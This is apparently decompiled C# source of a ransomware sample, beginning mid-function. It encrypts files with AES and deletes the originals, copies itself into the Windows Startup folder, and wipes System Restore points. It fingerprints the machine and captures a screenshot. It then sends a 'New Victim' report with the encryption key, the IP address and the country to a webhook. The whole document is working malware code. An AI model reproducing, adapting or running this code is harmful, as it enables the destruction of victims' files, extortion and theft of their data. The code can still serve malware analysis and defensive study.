							goto IL_00db;
						case 21:
							goto IL_00e9;
						case 22:
							goto IL_00f7;
						case 23:
							goto IL_0105;
						case 24:
							goto end_IL_0001_2;
						default:
							goto end_IL_0001;
						case 25:
						case 26:
							goto end_IL_0001_3;
						}
						goto default;
					}
					IL_0090:
					num = 15;
					num5 = fsInput.Read(buffer, 0, 4096);
					goto IL_00a6;
					IL_00a6:
					num = 16;
					cryptoStream.Write(buffer, 0, num5);
					goto IL_00b5;
					IL_0105:
					num = 23;
					fileInfo = new FileInfo(strInputFile);
					break;
					IL_00b5:
					num = 17;
					num6 = checked(num6 + num5);
					goto IL_00c1;
					IL_000b:
					num = 2;
					fsInput = new FileStream(strInputFile, FileMode.Open, FileAccess.Read);
					goto IL_001a;
					IL_001a:
					num = 3;
					fsOutput = new FileStream(strOutputFile, FileMode.OpenOrCreate, FileAccess.Write);
					goto IL_0029;
					IL_0029:
					num = 4;
					fsOutput.SetLength(0L);
					goto IL_0038;
					IL_0038:
					num = 5;
					buffer = new byte[4097];
					goto IL_0045;
					IL_0045:
					num = 6;
					num6 = 0L;
					goto IL_004b;
					IL_004b:
					num = 7;
					length = fsInput.Length;
					goto IL_0059;
					IL_0059:
					num = 8;
					rijndaelManaged = new RijndaelManaged();
					goto IL_0063;
					IL_0063:
					num = 9;
					if (Direction == CryptoAction.ActionEncrypt)
					{
						goto IL_0072;
					}
					goto IL_00c1;
					IL_0072:
					num = 11;
					cryptoStream = new CryptoStream(fsOutput, rijndaelManaged.CreateEncryptor(bytKey, bytIV), CryptoStreamMode.Write);
					goto IL_00c1;
					IL_00c1:
					num = 14;
					if (num6 < length)
					{
						goto IL_0090;
					}
					goto IL_00d0;
					IL_00d0:
					num = 19;
					cryptoStream.Close();
					goto IL_00db;
					IL_00db:
					num = 20;
					fsInput.Close();
					goto IL_00e9;
					IL_00e9:
					num = 21;
					fsOutput.Close();
					goto IL_00f7;
					IL_00f7:
					num = 22;
					if (Direction != CryptoAction.ActionEncrypt)
					{
						goto end_IL_0001_3;
					}
					goto IL_0105;
					end_IL_0001_2:
					break;
				}
				num = 24;
				fileInfo.Delete();
				break;
				end_IL_0001:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 410;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	private static byte[] CreateKey(string strPassword)
	{
		char[] array = strPassword.ToCharArray();
		int upperBound = array.GetUpperBound(0);
		checked
		{
			byte[] array2 = new byte[upperBound + 1];
			int upperBound2 = array.GetUpperBound(0);
			for (int i = 0; i <= upperBound2; i++)
			{
				array2[i] = (byte)Strings.Asc(array[i]);
			}
			SHA512Managed sHA512Managed = new SHA512Managed();
			byte[] array3 = sHA512Managed.ComputeHash(array2);
			byte[] array4 = new byte[32];
			int num = 0;
			do
			{
				array4[num] = array3[num];
				num++;
			}
			while (num <= 31);
			return array4;
		}
	}

	private static byte[] CreateIV(string strPassword)
	{
		char[] array = strPassword.ToCharArray();
		int upperBound = array.GetUpperBound(0);
		checked
		{
			byte[] array2 = new byte[upperBound + 1];
			int upperBound2 = array.GetUpperBound(0);
			for (int i = 0; i <= upperBound2; i++)
			{
				array2[i] = (byte)Strings.Asc(array[i]);
			}
			SHA512Managed sHA512Managed = new SHA512Managed();
			byte[] array3 = sHA512Managed.ComputeHash(array2);
			byte[] array4 = new byte[16];
			int num = 32;
			do
			{
				array4[num - 32] = array3[num];
				num++;
			}
			while (num <= 47);
			return array4;
		}
	}

	public static object startup(string filename)
	{
		object result = default(object);
		try
		{
			string text = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + St.mute + ".exe";
			if (File.Exists(text))
			{
				protect = new FileStream(text, FileMode.Open);
				return result;
			}
			File.Copy(filename, text);
			protect = new FileStream(text, FileMode.Open);
			return result;
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			ProjectData.ClearProjectError();
			return result;
		}
	}

	[DllImport("Srclient.dll")]
	public static extern int SRRemoveRestorePoint(int index);

	private static void DeleteRestorePoints()
	{
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_0017: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0033: Expected O, but got Unknown
		try
		{
			ManagementClass val = new ManagementClass("\\\\.\\root\\default", "systemrestore", new ObjectGetOptions());
			ManagementObjectCollection instances = val.GetInstances();
			ManagementObjectEnumerator enumerator = default(ManagementObjectEnumerator);
			try
			{
				enumerator = instances.GetEnumerator();
				while (enumerator.MoveNext())
				{
					ManagementObject val2 = (ManagementObject)enumerator.get_Current();
					SRRemoveRestorePoint(Conversions.ToInteger(Conversions.ToUInteger(((ManagementBaseObject)val2).get_Item("sequencenumber")).ToString()));
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			ProjectData.ClearProjectError();
		}
	}

	public static object Bot()
	{
		try
		{
			return Operators.ConcatenateObject(Operators.ConcatenateObject(UserName(), (object)"_"), (object)HWID());
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			object result = "Error";
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static object UserName()
	{
		try
		{
			return Environment.UserName;
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			object result = "Error";
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static string HWID()
	{
		try
		{
			string text = Identifier("Win32_Processor", "ProcessorId");
			text = text + "-" + Identifier("Win32_BIOS", "SerialNumber");
			text = text + "-" + Identifier("Win32_BaseBoard", "SerialNumber");
			text = text + "-" + Identifier("Win32_VideoController", "Name");
			return MD5HASH(text);
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			string result = "Error";
			ProjectData.ClearProjectError();
			return result;
		}
	}

	private static string Identifier(string wmiClass, string wmiProperty)
	{
		//IL_0009: Unknown result type (might be due to invalid IL or missing references)
		//IL_000f: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_002e: Expected O, but got Unknown
		try
		{
			string text = "";
			ManagementClass val = new ManagementClass(wmiClass);
			ManagementObjectCollection instances = val.GetInstances();
			ManagementObjectEnumerator enumerator = default(ManagementObjectEnumerator);
			try
			{
				enumerator = instances.GetEnumerator();
				while (enumerator.MoveNext())
				{
					ManagementObject val2 = (ManagementObject)enumerator.get_Current();
					if (Operators.CompareString(text, "", false) == 0)
					{
						try
						{
							text = ((ManagementBaseObject)val2).get_Item(wmiProperty).ToString();
						}
						catch (Exception projectError)
						{
							ProjectData.SetProjectError(projectError);
							ProjectData.ClearProjectError();
							continue;
						}
						break;
					}
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			return text;
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			string result = "Error";
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static string MD5HASH(string input)
	{
		checked
		{
			try
			{
				MD5CryptoServiceProvider mD5CryptoServiceProvider = new MD5CryptoServiceProvider();
				byte[] array = mD5CryptoServiceProvider.ComputeHash(Encoding.UTF8.GetBytes(input));
				StringBuilder stringBuilder = new StringBuilder();
				int num = array.Length - 1;
				for (int i = 10; i <= num; i++)
				{
					stringBuilder.Append(array[i].ToString("x2"));
				}
				return stringBuilder.ToString().ToUpper();
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				string result = "Error";
				ProjectData.ClearProjectError();
				return result;
			}
		}
	}

	public static bool sends(string hashh)
	{
		//IL_0019: Unknown result type (might be due to invalid IL or missing references)
		//IL_001f: Expected O, but got Unknown
		bool result = default(bool);
		try
		{
			NewWebhook newWebhook = new NewWebhook(NewWebhook.webhookk);
			newWebhook._name = NewWebhook.name;
			PictureBox val = new PictureBox();
			val.set_Image((Image)(object)TakeScreenShot());
			val.get_Image().Save(Path.GetTempPath() + Environment.UserName + "-screenshot.jpg");
			WebClient webClient = new WebClient();
			string text = webClient.DownloadString("http://ip-api.com/csv/?fields=country,query");
			newWebhook.SendSysInfo(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)("**New Victim**" + Environment.NewLine + "ID : " + hashh + Environment.NewLine + "Key : "), check.AES_Decrypttt(Interaction.GetSetting("F", "0", St.Setting, ""), HWID() + HWID())), (object)Environment.NewLine), (object)"IP : "), (object)text.Split(new char[1] { ',' })[1]), (object)"Country : "), (object)text.Split(new char[1] { ',' })[0]), (object)Environment.NewLine), (object)"OS : "), (object)((ServerComputer)MyProject.Computer).get_Info().get_OSFullName()), (object)Environment.NewLine), (object)"Date&Time : "), (object)DateTime.Now.ToString("yyyy/MM/dd HH:mm:ss"))), "Screenshot.jpg", Path.GetTempPath() + Environment.UserName + "-screenshot.jpg");
			result = true;
			return result;
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static Bitmap TakeScreenShot()
	{
		//IL_0068: Unknown result type (might be due to invalid IL or missing references)
		//IL_006e: Expected O, but got Unknown
		Size size = new Size(((Computer)MyProject.Computer).get_Screen().get_Bounds().Width, ((Computer)MyProject.Computer).get_Screen().get_Bounds().Height);
		Bitmap val = new Bitmap(((Computer)MyProject.Computer).get_Screen().get_Bounds().Width, ((Computer)MyProject.Computer).get_Screen().get_Bounds().Height);
		Graphics val2 = Graphics.FromImage((Image)(object)val);
		val2.CopyFromScreen(new Point(0, 0), new Point(0, 0), size);
		return val;
	}
}
